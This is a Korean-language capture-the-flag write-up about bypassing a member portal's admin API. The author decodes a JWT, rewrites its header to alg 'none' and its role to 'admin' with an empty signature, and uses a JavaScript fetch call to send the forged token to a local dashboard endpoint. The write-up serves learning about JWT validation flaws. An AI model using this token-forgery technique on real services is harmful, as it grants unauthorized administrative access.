문제설명: 아이디만 입력하면 로그인되는 모임 회원포탈이다. 발급된 토큰으로 정보를 조회하거나, 관리자라면 관리자 전용 대시보드에 접근할 수 있다. 목표: 서명이 없는 토큰으로 관리자 api를 통과하…

문제설명:

아이디만 입력하면 로그인되는 모임 회원포탈이다. 발급된 토큰으로 정보를 조회하거나, 관리자라면 관리자 전용 대시보드에 접근할 수 있다.

목표:

서명이 없는 토큰으로 관리자 api를 통과하라

 

Write up:

페이지에 들어가면 신고서를 작성할 수 있는 란이 있다.
탐방객 이름을 받아서 신고접수를 하면 토큰을 발급한다.
내 신고내용을 누르면 role과 username을 확인할 수 있다.
관리사무소 자료는 error: "관리자만 접근할 수 있습니다."라는 문구가 뜬다.

/api/profile에서 내 신고내용을, /api/admin/dashboard에서 관리사무소 전용 자료를 확인할 수 있다라고 적혀져있었고,
GET  /api/admin/dashboard    헤더 Authorization: Bearer <token>라는 값이 블러처리 되어있었다.
관리자용 토큰을 발급받은뒤 dashboard에 get으로 헤더에 token값을 넣어서 호출 하라는것 같다.

1. session 값 수정
role을 admin 으로 수정하고 /api/admin/dashboard에 접근했지만 토큰값자체가 수정된것은 아니기에 실패했다.

1번이 실패 한뒤, 토큰값을 base64에 디코딩해보았다.
데이터의 페이로드에는 다음과 같은 값이 들어있었다.

{
  "username": "hiker01",
  "role": "member"
}



데이터의 헤더에는

 {"alg": "HS256", "typ": "JWT"}

값이 들어있었다.

그래서 토큰값을 임의로 작성해 인코딩하기로 했다.

우선 alg를none으로 바꾸어 보았다.
페이로드는 role만 바꾸어주었고 서명은 비워두었다.

그렇게 인코딩해 토큰값을 만들어준뒤
fetch 함수를 사용해 /api/admin/dashboard에 보내주는 함수를 작성했다. 

{
    const myToken = "eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VybmFtZSI6ICJoaWtlcjAxIiwgInJvbGUiOiAiYWRtaW4ifQ.";
    const myUrl = "http://127.0.0.1:8151/api/admin/dashboard"; 

    fetch(myUrl, {
        method: "GET",
        headers: {
            "Authorization": `Bearer ${myToken}`,
            "Content-Type": "application/json"
        }
    })
    .then(response => {
        console.log("Status Code:", response.status); 
        return response.text(); 
    })
    .then(data => {
        console.log("Response Data:", data); 
    })
    .catch(error => {
        console.error("Error:", error);
    });
}

 

바로 플래그가 떴다.

 

토큰값을 인코딩해볼 생각을 처음 해본것 같다.
